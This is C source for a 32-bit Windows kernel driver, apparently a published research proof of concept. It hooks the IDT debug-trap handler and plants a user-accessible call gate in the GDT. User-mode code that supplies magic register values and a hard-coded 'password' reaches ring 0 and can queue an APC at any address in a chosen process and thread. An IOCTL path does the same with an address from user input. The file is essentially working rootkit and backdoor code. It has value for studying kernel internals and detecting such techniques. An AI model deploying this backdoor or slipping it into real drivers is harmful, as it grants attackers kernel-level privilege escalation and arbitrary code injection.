/*
MIT License

https://github.com/therealdreg/dregate

Copyright (c) [2022] by David Reguera Garcia aka Dreg 
dreg@fr33project.org
https://www.fr33project.org 
https://github.com/therealdreg
TW @therealdreg

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

WARNING: BULLSHIT CODE X-)
*/

/*

TODO:

add more cores support, now its limited and bullshit :-(

MoreThan64proc Support Systems That Have More Than 64 Processors: https://download.microsoft.com/download/a/d/f/adf1347d-08dc-41a4-9084-623b1194d4b2/morethan64proc.docx

ULONG Count;
ULONG ProcIndex;
PROCESSOR_NUMBER ProcNumber;
GROUP_AFFINITY Affinity = { 0 };
GROUP_AFFINITY PreviousAffinity = { 0 };


Count = KeQueryActiveProcessorCountEx(ALL_PROCESSOR_GROUPS);
for (ProcIndex = 0; ProcIndex < Count; ProcIndex += 1) 
{
KeGetProcessorNumberFromIndex(ProcIndex, &ProcNumber);

if (!NT_SUCCESS(Status))
{
return Status;
}

Affinity.Group = ProcNumber.Group;
Affinity.Mask = 1ull << ProcNumber.Number;
KeSetSystemGroupAffinityThread(&Affinity, &PreviousAffinity);

...


KeRevertToUserGroupAffinityThread(&PreviousAffinity);


}
...
KDPC Dpc[MAXIMUM_PROC_PER_SYSTEM];
ULONG ProcIndex;
PROCESSOR_NUMBER ProcNumber;
for (ProcIndex = 0; ProcIndex < MAXIMUM_PROC_PER_SYSTEM; ProcIndex += 1) 
{
KeInitializeDpc(Dpc + ProcIndex, …);
if (KeGetProcessorNumberFromIndex(ProcIndex, &ProcNumber) == STATUS_SUCCESS) 
{
KeSetTargetProcessorDpcEx(... &ProcNumber);

KeInsertQueueDpc
...
}
}

*/


#include "drvdregate.h"


//#define PRINT_DP_STCK
#ifdef PRINT_DP_STCK
void** esp_reg;
int cnt;
#endif


//#define NO_FULL_GATE_INFO 1

#define NO_FULL_PRINT_DESCS 1


//Uncomment the following line to disable DbgPrint debug:
//#define DbgPrint (void) sizeof


static DWORD called_flag;
static CALL_GATE_DESCRIPTOR old_call_gate_descriptor;
static CALL_GATE_DESCRIPTOR old_call_gate_descriptor_cgateloop;
static void* original_kitrap_01; 
static IDTENTRY original_idt_entry_kitrap_01;
static PDEVICE_OBJECT o_device_object;
static LONG lock_acquired;
static LONG nr_cores_locked;
static DWORD number_of_cores;
static BIG_LCK_t big_lock;


void show_banner(void)
{
    DbgPrint("\n\ndrvdregate driver by Dreg https://github.com/therealdreg/dregate\n\n");
}

NTSTATUS init_number_of_cores(void)
{
    SYSTEM_BASIC_INFORMATION  system_basic_information = { 0 };
    NTSTATUS                  ntstatus = STATUS_SUCCESS;

    ntstatus = ZwQuerySystemInformation( SystemBasicInformation, & system_basic_information, sizeof( system_basic_information ), NULL );
    if (!NT_SUCCESS(ntstatus))
    {
        DbgPrint("ZwQuerySystemInformation Status %d 0x%x\n", ntstatus, ntstatus);
        return ntstatus;
    }

    DbgPrint("caching cores... TODO: this not works in windows that use hot-add CPU functionality and/or procgroup != 0 :-(\n");

    number_of_cores = system_basic_information.NumberOfProcessors;

    DbgPrint("Number of cores: %d\n", number_of_cores);

    return ntstatus;
}

void set_affinity_mask_core_one(void)
{
    KAFFINITY affinity_mask;

    affinity_mask = 1;
    DbgPrint( "\nSetting AffinityMask to Core ONE\n");
    KeSetSystemAffinityThread(affinity_mask);
}

KIRQL raise_irql(void)
{
    KIRQL curr;
    KIRQL prev;

    curr = KeGetCurrentIrql();
    prev = curr;

    if (curr < DISPATCH_LEVEL)
    {
        KeRaiseIrql(DISPATCH_LEVEL, &prev);
    }

    return prev;
}

void dpc_lock_function(PKDPC dpc, PVOID context, PVOID arg1, PVOID arg2)
{
    UNREFERENCED_PARAMETER(arg1);
    UNREFERENCED_PARAMETER(arg2);
    UNREFERENCED_PARAMETER(context);
    UNREFERENCED_PARAMETER(dpc);

    DbgPrint("core %u\n", KeGetCurrentProcessorNumber());

    InterlockedIncrement(&nr_cores_locked);

    while (InterlockedCompareExchange(&lock_acquired, 1, 1) == 0)
    {
        __asm { nop };
    }

    InterlockedDecrement(&nr_cores_locked);

    DbgPrint("core %u\n", KeGetCurrentProcessorNumber());   
}

PKDPC lock_all_other_cores(void)
{
    PKDPC  dpcs;
    DWORD  core_id;
    DWORD  i;
    LONG   nr_other_cores;

    if (KeGetCurrentIrql() != DISPATCH_LEVEL) 
    { 
        return NULL; 
    }

    InterlockedAnd(&lock_acquired, 0);
    InterlockedAnd(&nr_cores_locked, 0);

    dpcs = (PKDPC)ExAllocatePool(NonPagedPool, number_of_cores * sizeof(KDPC));
    if (NULL == dpcs) 
    { 
        return NULL; 
    }

    core_id = KeGetCurrentProcessorNumber();
    DbgPrint("core id %u\n", core_id);

    for (i = 0; i < number_of_cores; i++)
    {
        PKDPC dpcPtr = &(dpcs[i]);

        if (i != core_id)
        {
            KeInitializeDpc(dpcPtr, dpc_lock_function, NULL);
            KeSetTargetProcessorDpc(dpcPtr, (CCHAR)i);
            KeInsertQueueDpc(dpcPtr, NULL, NULL);
        }
    }

    nr_other_cores = number_of_cores - 1;
    InterlockedCompareExchange(&nr_cores_locked, nr_other_cores, nr_other_cores);
    while (nr_cores_locked != nr_other_cores)
    {
        __asm { nop };
        InterlockedCompareExchange(&nr_cores_locked, nr_other_cores, nr_other_cores);
    }

    DbgPrint("all cores locked!\n");

    return dpcs;
}

NTSTATUS release_lock_all_other_cores(PVOID dpcs)
{
    InterlockedIncrement(&lock_acquired);

    InterlockedCompareExchange(&nr_cores_locked, 0, 0);
    while (nr_cores_locked != 0)
    {
        __asm { nop };
        InterlockedCompareExchange(&nr_cores_locked, 0, 0);
    }
    if (NULL != dpcs)
    {
        ExFreePool(dpcs);
    }

    DbgPrint("all cores unlocked!\n");

    return STATUS_SUCCESS;
}

void lower_irql(KIRQL prev)
{
    KeLowerIrql(prev);
}

BOOL acquire_big_lock(void)
{
    KeAcquireSpinLock(&(big_lock.lock), &(big_lock.old_irql));

    DbgPrint("locking all cores... called from: %lu\n", KeGetCurrentProcessorNumber());

    big_lock.dpcs = NULL;

    big_lock.dpcs = lock_all_other_cores();
    if (NULL == big_lock.dpcs)
    {
        KeReleaseSpinLock(&(big_lock.lock), big_lock.old_irql);
        DbgPrint("\nERROR: big lock fails\n");
        return FALSE;
    }

    return TRUE;
}

BOOL release_big_lock(void)
{
    BOOL      retf = TRUE;
    NTSTATUS  ntstatus;

    DbgPrint("unlocking all cores... called from: %lu\n", KeGetCurrentProcessorNumber());

    ntstatus = release_lock_all_other_cores(big_lock.dpcs);
    if (!NT_SUCCESS(ntstatus))
    {
        DbgPrint("\nERROR: big unlock fails!\n");
        retf = FALSE;

    }
    KeReleaseSpinLock(&(big_lock.lock), big_lock.old_irql);

    return retf;
}

void print_raw_8bytes(unsigned char* data)
{
    DbgPrint("RAW: %02x %02x %02x %02x %02x %02x %02x %02x (addr: 0x%08X)\n", 
        data[0], 
        data[1],
        data[2],
        data[3],
        data[4],
        data[5],
        data[6],
        data[7],
        data
        );
}

void print_gidt(DWORD selector, PSEG_DESCRIPTOR descriptor)
{
    DWORD baseAddress = 0;
    DWORD limit = 0;
    DWORD increment = 0;
    char* type[] =
    {
        "Data RO",
        "Data RO AC",
        "Data RW",
        "Data RW Ac",
        "Data RO E",
        "Data RO EA" ,
        "Data RW E ",
        "Data RW EA ",
        "Code EO ",
        "Code EO Ac ",
        "Code RE ",
        "Code RE Ac ",
        "Code EO C ",
        "Code EO CA ",
        "Code RE C ",
        "Code RE CA ",
        "<Reserved> ",
        "T5516 Avl ",
        "LDT ",
        "T5516 Busy ",
        "CallGate16 " ,
        "Task Gate ",
        "Int Gate16 ",
        "TrapGate16 " ,
        "<Reserved> " ,
        "T5532 Avl ",
        "<Reserved > " ,
        "T5532 Busy ",
        "CallGate32 " ,
        "<Reserved> ",
        "Int Gate32 ",
        "TrapGate32 "
    };
    DWORD index = 0;
    char* present[] = {"Np", "P "};
    char* granularity[] = {"By", "Pg"};

    baseAddress = 0;
    baseAddress = baseAddress + descriptor->baseAddress_24_31;
    baseAddress = baseAddress << 8;
    baseAddress = baseAddress + descriptor->baseAddress_16_23;
    baseAddress = baseAddress << 16;
    baseAddress = baseAddress + descriptor->baseAddress_00_15;

    limit = 0;
    limit = limit + descriptor->size_16_19;
    limit = limit << 16;
    limit = limit + descriptor->size_00_15;

    if (1 == descriptor->gFlag)
    {
        increment = 4096;
        limit++;
        limit = limit*increment;
        limit--;
    }

    index = 0;
    index = descriptor->type;

    if(0 == descriptor->sFlag)
    { 
        index = index + 16;
    }

    DbgPrint("%04x %08x %08x %s %u - - %s %s %u\n" ,
        selector,
        baseAddress,
        limit,
        type[index] ,
        descriptor->dpl,
        granularity[descriptor->gFlag],
        present[descriptor->pFlag],
        descriptor->sFlag);

    print_raw_8bytes((unsigned char*) descriptor);
}


IDTENTRY* get_idt(void)
{
    IDTINFO idtr = { 0 };

    __asm { sidt idtr }

    return (IDTENTRY*) ((idtr.LowIDTbase)|((ULONG)idtr.HiIDTbase<<16)); 
}


DWORD get_idt_size(void)
{
    GIDTR idtr = { 0 };

    __asm { sidt idtr }

    return idtr.nBytes / 8; 
}


void walk_gidt(char* name, void* (* base)(void), DWORD (* size)(void), DWORD entry)
{
    DWORD            nr_gidt = 0;
    PSEG_DESCRIPTOR  pidt = NULL;
    DWORD            j = 0;
    KAFFINITY        affinity_mask = 0;
    KIRQL            old_irql;

    #ifndef NO_FULL_PRINT_DESCS
        int i;
    #endif

    DbgPrint("\nWalking %s....\n", name);

    for ( j = 0; j < number_of_cores; j++ )
    {
        affinity_mask = 1 << j;
        DbgPrint( "\nSetting AffinityMask to Core: %d (mask 0x%x)...:\n", j + 1, affinity_mask );
        KeSetSystemAffinityThread(affinity_mask);

        DbgPrint( " Show %s in core %d...:\n", name, j + 1 );

        old_irql = raise_irql();
        pidt = base();
        nr_gidt = size();
        lower_irql(old_irql);

        DbgPrint (" Sel Base Limit Type P Sz G Pr Sys\n");
        DbgPrint("-- -- -------- -------- ---- ------ - -- -- -- ---\n");
#ifdef NO_FULL_PRINT_DESCS
        old_irql = raise_irql();
        print_gidt(entry, pidt + entry);
        lower_irql(old_irql);
#else
        for (i = 0; i < nr_gidt; i++ )
        {
            old_irql = raise_irql();
            print_gidt( (i * 8), pidt);
            lower_irql(old_irql);

            pidt++;
        }
#endif
    }
}

void walk_idt(void)
{
    walk_gidt("IDT", get_idt, get_idt_size, IDT_KITRAP_01_INDEX);
}

PSEG_DESCRIPTOR get_gdt(void)
{
    GIDTR gdtr = { 0 };

    __asm { sgdt gdtr }

    return (PSEG_DESCRIPTOR) gdtr.baseAddress;
}

DWORD get_gdt_size(void)
{
    GIDTR gdtr = { 0 };

    __asm { sgdt gdtr }

    return gdtr.nBytes / 8; 
}

void walk_gdt(void)
{
    walk_gidt("GDT", get_gdt, get_idt_size, GDT_ENTRY_CALL_GATE_INDEX);
    DbgPrint("\n\nfor cgateloop:\n\n");
    walk_gidt("GDT", get_gdt, get_idt_size, GDT_ENTRY_CALL_GATE_CGATELOOP_INDEX);
}


CALL_GATE_DESCRIPTOR build_call_gate(BYTE* proc_address, WORD nr_args)
{
    DWORD                 address = 0;
    CALL_GATE_DESCRIPTOR  call_gate_descriptor = { 0 };

    address = (DWORD) proc_address;
    DbgPrint("call gate procaddr: 0x%08X\n", address);
    
    call_gate_descriptor.selector = KGDT_R0_CODE;
    call_gate_descriptor.argCount = nr_args;
    call_gate_descriptor.zeroes = 0; 
    call_gate_descriptor.type = I386_CALL_GATE_TYPE; 
    call_gate_descriptor.sFlag = 0; 
    call_gate_descriptor.dpl = 0x3; 
    call_gate_descriptor.pFlag = 1; 
    call_gate_descriptor.offset_00_15 = (WORD)(0x0000FFFF & address);
    address = address >> 16;
    call_gate_descriptor.offset_16_31 = (WORD)(0x0000FFFF & address);

    return call_gate_descriptor;
}

CALL_GATE_DESCRIPTOR hook_gdt(CALL_GATE_DESCRIPTOR call_gate_descriptor, int index)
{
    PSEG_DESCRIPTOR        gdt = NULL;
    PSEG_DESCRIPTOR        gdt_entry = NULL;
    PCALL_GATE_DESCRIPTOR  old_call_gate_ptr = NULL;
    CALL_GATE_DESCRIPTOR   old_call_gate = { 0 };
    
    set_affinity_mask_core_one();

    acquire_big_lock();

    gdt = get_gdt();
    old_call_gate_ptr = (PCALL_GATE_DESCRIPTOR)&(gdt[index]);
    old_call_gate = *old_call_gate_ptr;
    gdt_entry = (PSEG_DESCRIPTOR)&call_gate_descriptor;
    gdt[index] = *gdt_entry;

    DbgPrint("\n\n OK! CallGate injected: Core 1, GDT 0x%x (0x%08X)\n", index * 8, &(gdt[index]));
    DbgPrint("GDT entry added: \n");
    print_raw_8bytes((unsigned char*) (gdt + index));

    release_big_lock();

    return old_call_gate;
}


VOID NTAPI free_apc(void* Apc,
                   PKNORMAL_ROUTINE* NormalRoutine,
                   PVOID* NormalContext,
                   PVOID* SystemArgument1,
                   PVOID* SystemArgument2)
{
    UNREFERENCED_PARAMETER(NormalRoutine);
    UNREFERENCED_PARAMETER(NormalContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);

    ExFreePool(Apc);
}

void inject_apc(void* addr, DWORD pid, DWORD tid)
{
    PKAPC     apc;
    BOOLEAN   injected;
    NTSTATUS  ntstatus;
    PETHREAD  ethread;

    DbgPrint("PID: %d TID: %d\n", pid, tid);

    ntstatus = PsLookupThreadByThreadId((HANDLE)tid, &ethread);
    if (NT_SUCCESS(ntstatus))
    {
        DbgPrint("ok PsLookupThreadByThreadId\n");
        apc = ExAllocatePool(NonPagedPool, sizeof(*apc));
        if (NULL != apc)
        {
            KeInitializeApc(apc, 
                            ethread, 
                            OriginalApcEnvironment, 
                            free_apc, 
                            NULL, 
                            addr, 
                            UserMode, 
                            (PVOID)APC_ARG1_dr3g );								  
            injected = KeInsertQueueApc(apc, (PVOID)APC_ARG2_DrEg, (PVOID)APC_ARG3_dRE6, 0);
            if (injected)
            {
                DbgPrint("\nOk Queue APC\n");
            }
            else
            {
                ExFreePool(apc);
            }
        }
        ObDereferenceObject(ethread);
    }
}


VOID work_function(PDEVICE_OBJECT fdo, PWORK_ITEM_ARGS work_item_args)
{
    UNREFERENCED_PARAMETER(fdo);

    DbgPrint("\nwork called! queue APC...\n");

    DbgPrint("APC -> 0x%x\n", work_item_args->addr_to_ret);
    inject_apc((void*)work_item_args->addr_to_ret, work_item_args->pid, work_item_args->tid);

    IoFreeWorkItem(work_item_args->item);

    ExFreePool(work_item_args);
}

void call_gate_high_ep(gate_info_t* gate_info)
{
    PWORK_ITEM_ARGS work_item_args = NULL;
    PIO_WORKITEM    item = NULL;

    DbgPrint( "call gate executed from usermode call far TF=1 -> kitrap01 (idt 1) JMP FAR -> this code X-)\n" );

#ifndef NO_FULL_GATE_INFO
    DbgPrint(
        "gate_info->saved_es: 0x%08X\n"
        "gate_info->saved_ds: 0x%08X\n"
        "gate_info->saved_fs: 0x%08X\n"
        "gate_info->saved_eflags: 0x%08X\n"
        ,
        gate_info->saved_es,
        gate_info->saved_ds,
        gate_info->saved_fs,
        gate_info->saved_eflags
        );

    DbgPrint(
        "gate_info->pusha_edi: 0x%08X\n"
        "gate_info->pusha_esi: 0x%08X\n"
        "gate_info->pusha_ebp: 0x%08X\n"
        "gate_info->pusha_esp_ring0: 0x%08X\n"
        "gate_info->pusha_ebx: 0x%08X\n"
        "gate_info->pusha_edx: 0x%08X\n"
        "gate_info->pusha_ecx: 0x%08X\n"
        "gate_info->pusha_eax: 0x%08X\n"
        ,
        gate_info->pusha_edi,
        gate_info->pusha_esi,
        gate_info->pusha_ebp,
        gate_info->pusha_esp_ring0,
        gate_info->pusha_ebx,
        gate_info->pusha_edx,
        gate_info->pusha_ecx,
        gate_info->pusha_eax
        );
#endif

    DbgPrint(
        "gate_info->trap_eip_call_gate_addr: 0x%08X\n"
        "gate_info->trap_cs: 0x%08X\n"
        "gate_info->trap_eflags: 0x%08X\n"
        ,
        gate_info->trap_eip_call_gate_addr,
        gate_info->trap_cs,
        gate_info->trap_eflags
        );

    DbgPrint(
        "gate_info->ret_addr_for_call_far: 0x%08X\n"
        "gate_info->usermode_cs: 0x%08X\n"
        ,
        gate_info->ret_addr_for_call_far,
        gate_info->usermode_cs
        );

    DbgPrint(
        "gate_info->arg1: 0x%08X\n"
        "gate_info->arg2: 0x%08X\n"
        "gate_info->arg3: 0x%08X\n"
        "gate_info->arg4: 0x%08X\n"
        "gate_info->arg5: 0x%08X\n"
        "gate_info->arg6: 0x%08X\n"
        "gate_info->arg7: 0x%08X\n"
        ,
        gate_info->arg1,
        gate_info->arg2,
        gate_info->arg3,
        gate_info->arg4,
        gate_info->arg5,
        gate_info->arg6,
        gate_info->arg7
        );

    DbgPrint(
        "gate_info->usermode_esp: 0x%08X\n"
        "gate_info->usermode_ss: 0x%08X\n"
        ,
        gate_info->usermode_esp,
        gate_info->usermode_ss
        );

    if (gate_info->arg7 == (void*)0x63)
    {
        DbgPrint("\nSuccess! correct password! queue work item\n\n");		

        work_item_args = (PWORK_ITEM_ARGS) ExAllocatePool(NonPagedPool, sizeof(*work_item_args));
        if (NULL != work_item_args)
        {
            item = IoAllocateWorkItem(o_device_object);
            if (NULL == item)
            {
                ExFreePool(work_item_args);
            }
            else
            {
                work_item_args->item = item;
                work_item_args->addr_to_ret = (DWORD)gate_info->arg1;
                work_item_args->pid = (DWORD)gate_info->arg2;
                work_item_args->tid = (DWORD)gate_info->arg3;

                DbgPrint("calling IoQueueWorkItem: WorkRoutine: 0x%x junk: 0x%x item: 0x%x\n", work_function, work_item_args, item);
                IoQueueWorkItem(item, work_function, DelayedWorkQueue, work_item_args);
            }
        }
    }
    else
    {
        DbgPrint("\nincorrect password!\n\n");
    }
}

void __declspec(naked) call_gate_cgateloop_ep(void)
{
    __asm { retf };
}


void __declspec(naked) call_gate_ep(void)
{
    __asm
    {
        pushad; 
        pushfd;

        push fs; 
        mov bx, KGDT_R0_PCR; 
        mov fs, bx;
        push ds;
        push es;

#ifdef PRINT_DP_STCK
        mov esp_reg, esp;
#endif

        push esp;

        call call_gate_high_ep;
    }

#ifdef PRINT_DP_STCK
    for (cnt = 0; cnt < 60; cnt++)
    {
        DbgPrint("esp[%d %d] = 0x%08X\n", cnt, cnt * 4, *esp_reg);
        esp_reg++;
    }
#endif

    called_flag = 0xBADC0FFE;

    __asm
    {
        pop es;
        pop ds;
        pop fs;
        popfd;
        popad;

        push esi;     // new ss
        push ebp;     // new esp
        push 0x246;   // new eflags
        push edi;     // new cs
        push eax;     // new EIP

        iretd;
    }
}


void __declspec(naked) new_kitrap_01( void )
{
    __asm
    {
        cmp ebx, 0x69696969;
        jnz bypss;
        cmp ecx, 0x69696969;
        jnz bypss;
        cmp edx, 0x69696969;
        jnz bypss;
        _EMIT 0xEA; // JMP FAR 0x330
        _EMIT 0x00;
        _EMIT 0x00;
        _EMIT 0x00;
        _EMIT 0x00;
        _EMIT 0x30;
        _EMIT 0x03;
bypss:
        jmp original_kitrap_01;
    }
}

void hook_idt(void** old_entry, void* new_entry)
{
    IDTENTRY* idt_base = NULL;

    set_affinity_mask_core_one();

    acquire_big_lock();
    idt_base = get_idt();

    DbgPrint("IDT Base Addr: 0x%08X addr in table kitrap01 -> 0x%08X\n", idt_base, &(idt_base[IDT_KITRAP_01_INDEX]));

    original_idt_entry_kitrap_01 = idt_base[1];
    if (NULL != old_entry)
    {
        *old_entry = (void*) (MAKELONG(original_idt_entry_kitrap_01.LowOffset, original_idt_entry_kitrap_01.HiOffset));
        DbgPrint("old KiTrap01: 0x%08X\n", *old_entry);
    }

    DbgPrint("new KiTrap01: 0x%08X\n", new_entry);

#pragma warning(disable:4305)
    idt_base[IDT_KITRAP_01_INDEX].LowOffset = MAKELOW(new_entry);
#pragma warning(default:4305)
    idt_base[IDT_KITRAP_01_INDEX].HiOffset  = MAKEHIGH(new_entry);

    DbgPrint("IDT entry added: \n");
    print_raw_8bytes((unsigned char*) (idt_base + IDT_KITRAP_01_INDEX));

    release_big_lock();
}

NTSTATUS dioctl_create_close(PDEVICE_OBJECT device_object, PIRP irp)
{
    UNREFERENCED_PARAMETER(device_object);

    irp->IoStatus.Status = STATUS_SUCCESS;
    irp->IoStatus.Information = 0;

    IoCompleteRequest( irp, IO_NO_INCREMENT );

    return STATUS_SUCCESS;
}


NTSTATUS dioctl_device_control(PDEVICE_OBJECT device_object, PIRP irp)
{
    char                aux[100] = { 0 };
    PKAPC               apc;
    BOOLEAN             injected;
    PIO_STACK_LOCATION  irpsp;
    NTSTATUS            ntstatus = STATUS_INVALID_DEVICE_REQUEST;
    ULONG               in_buffer_len;
    ULONG               out_buffer_len; 
    PCHAR               in_buffer;
    PCHAR               out_buffer;
    PCHAR               data = DRV_CTL_STR;
    size_t              data_len = sizeof(DRV_CTL_STR);

    UNREFERENCED_PARAMETER(device_object);

    irpsp = IoGetCurrentIrpStackLocation(irp);
    in_buffer_len = irpsp->Parameters.DeviceIoControl.InputBufferLength;
    out_buffer_len = irpsp->Parameters.DeviceIoControl.OutputBufferLength;

    if (in_buffer_len && out_buffer_len)
    {
        if (IOCTL_DIOCTL_METHOD_BUFFERED == irpsp->Parameters.DeviceIoControl.IoControlCode)
        {
            DbgPrint("Called IOCTL_DIOCTL_METHOD_BUFFERED\n");

            in_buffer = irp->AssociatedIrp.SystemBuffer;
            out_buffer = irp->AssociatedIrp.SystemBuffer;

            RtlCopyBytes(aux, in_buffer, MIN(in_buffer_len, sizeof(aux) - 2));

            DbgPrint("IOCTL MSG: %s\n", aux + 5);
            apc = ExAllocatePool(NonPagedPool, sizeof(KAPC));
            if (NULL != apc)
            {
                KeInitializeApc(apc, 
                                PsGetCurrentThread(), 
                                OriginalApcEnvironment, 
                                free_apc, 
                                NULL,
                                *((void**)aux), 
                                UserMode, 
                                (PVOID)APC_ARG1_dr3g );								  
                injected = KeInsertQueueApc(apc, (PVOID)APC_ARG2_DrEg, (PVOID)APC_ARG3_dRE6, 0);
                if (injected)
                {
                    DbgPrint("\nOk Queue APC from IOCTL\n");
                }
                else
                {
                    ExFreePool(apc);
                }
            }

            RtlCopyBytes(out_buffer, data, out_buffer_len);

            irp->IoStatus.Information = (out_buffer_len < data_len ? out_buffer_len : data_len);

            ntstatus = STATUS_SUCCESS;
        }
        else
        {
            DbgPrint("ERROR: unrecognized IOCTL %x\n", irpsp->Parameters.DeviceIoControl.IoControlCode);
            ntstatus = STATUS_INVALID_DEVICE_REQUEST;
        }
    }
    else
    {
        ntstatus = STATUS_INVALID_PARAMETER;
    }

    irp->IoStatus.Status = ntstatus;

    IoCompleteRequest( irp, IO_NO_INCREMENT );

    return ntstatus;
}


void driver_unload(PDRIVER_OBJECT pDriverObject)
{
    PDEVICE_OBJECT device_object;
    UNICODE_STRING uni_win32_name_str;

    device_object = pDriverObject->DeviceObject;

    DbgPrint("Received signal to unload the driver\n");

    RtlInitUnicodeString(&uni_win32_name_str, DOS_DEVICE_NAME_W);

    IoDeleteSymbolicLink(&uni_win32_name_str);

    if (NULL != device_object)
    {
        IoDeleteDevice( device_object );
    }

    DbgPrint("Restoring old call gates and old idt\n");

    hook_gdt(old_call_gate_descriptor, GDT_ENTRY_CALL_GATE_INDEX);
    DbgPrint("\n\nfor cgateloop:\n\n");
    hook_gdt(old_call_gate_descriptor_cgateloop, GDT_ENTRY_CALL_GATE_CGATELOOP_INDEX);
    
    DbgPrint("\n===============================================\n\n");
    DbgPrint("GDTs restored:\n");
    walk_gdt();
    DbgPrint("\n===============================================\n\n");

    hook_idt(NULL, original_kitrap_01);
    DbgPrint("\n===============================================\n\n");
    DbgPrint("IDTs restored:\n");
    walk_idt();
    DbgPrint("\n===============================================\n\n");

    DbgPrint("Unload driver called_flag %08x\n\nBye!\n\n", called_flag);
}

unsigned int read_cr4( void )
{
	unsigned int cr4_val = 0;
	
    __asm 
	{ 
		_EMIT 0x0F; 
		_EMIT 0x20;
		_EMIT 0xE0; // mov eax, cr4; 
		
		mov cr4_val, eax;
	}
	
	return cr4_val;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT driver_object, PUNICODE_STRING reg_path)
{
    CALL_GATE_DESCRIPTOR call_gate_descriptor = { 0 };
    NTSTATUS             ntstatus;
    UNICODE_STRING       nt_unicode_str;  
    UNICODE_STRING       nt_win32_name_str;
	unsigned int         cr4 = read_cr4();

    UNREFERENCED_PARAMETER(reg_path);

    show_banner();
	
	DbgPrint("\nCR4: 0x%X - SMEP: %s , SMAP: %s\n\n", 
		cr4, (cr4 & (1 << 20)) ? "yes" : "no", (cr4 & (1 << 21)) ? "yes" : "no");

    KeInitializeSpinLock(&(big_lock.lock));

    ntstatus = init_number_of_cores();
    if ( !NT_SUCCESS( ntstatus ) )
    {
        DbgPrint("InitNumberOfCores\n");
        return ntstatus;
    }

    called_flag = 0;

    RtlInitUnicodeString( &nt_unicode_str, DEVNAME);

    ntstatus = IoCreateDevice(
        driver_object,                   
        0,                              
        &nt_unicode_str,               
        FILE_DEVICE_UNKNOWN,           
        FILE_DEVICE_SECURE_OPEN,     
        FALSE,                          
        &o_device_object );                

    if ( !NT_SUCCESS( ntstatus ) )
    {
        DbgPrint("Couldn't create the device object\n");
        return ntstatus;
    }

    RtlInitUnicodeString( &nt_win32_name_str, DOS_DEVICE_NAME_W );
    ntstatus = IoCreateSymbolicLink(&nt_win32_name_str, &nt_unicode_str );
    if ( !NT_SUCCESS( ntstatus ) )
    {
        DbgPrint("Couldn't create symbolic link\n");
        IoDeleteDevice( o_device_object );
    }

    driver_object->MajorFunction[IRP_MJ_CREATE] = dioctl_create_close;
    driver_object->MajorFunction[IRP_MJ_CLOSE] = dioctl_create_close;
    driver_object->MajorFunction[IRP_MJ_DEVICE_CONTROL] = dioctl_device_control;
    driver_object->DriverUnload = driver_unload;

    DbgPrint("\n===============================================\n\n");
    DbgPrint("IDTs before injection\n");
    walk_idt();
    DbgPrint("\n===============================================\n\n");

    hook_idt(&original_kitrap_01, new_kitrap_01);

    DbgPrint("\n===============================================\n\n");
    DbgPrint("IDTs after injection\n");
    walk_idt();
    DbgPrint("\n===============================================\n\n");

    DbgPrint("Injecting new call gates\n");

    DbgPrint("\n===============================================\n\n");
    DbgPrint("GDTs before injection\n");
    walk_gdt(); 
    DbgPrint("\n===============================================\n\n");

#pragma warning(disable:4054)
    call_gate_descriptor = build_call_gate((BYTE*)call_gate_ep, CALL_GATE_NR_ARGS);
#pragma warning(default:4054)

    old_call_gate_descriptor = hook_gdt(call_gate_descriptor, GDT_ENTRY_CALL_GATE_INDEX);

    DbgPrint("\n\nfor cgateloop:\n\n");

    memset(&call_gate_descriptor, 0, sizeof(call_gate_descriptor));
#pragma warning(disable:4054)
    call_gate_descriptor = build_call_gate((BYTE*)call_gate_cgateloop_ep, 0);
#pragma warning(default:4054)

    old_call_gate_descriptor_cgateloop = hook_gdt(call_gate_descriptor, GDT_ENTRY_CALL_GATE_CGATELOOP_INDEX);

    DbgPrint("\n===============================================\n\n");
    DbgPrint("GDTs after injection\n");

    walk_gdt();
    DbgPrint("\n===============================================\n\n");

    return STATUS_SUCCESS;
}
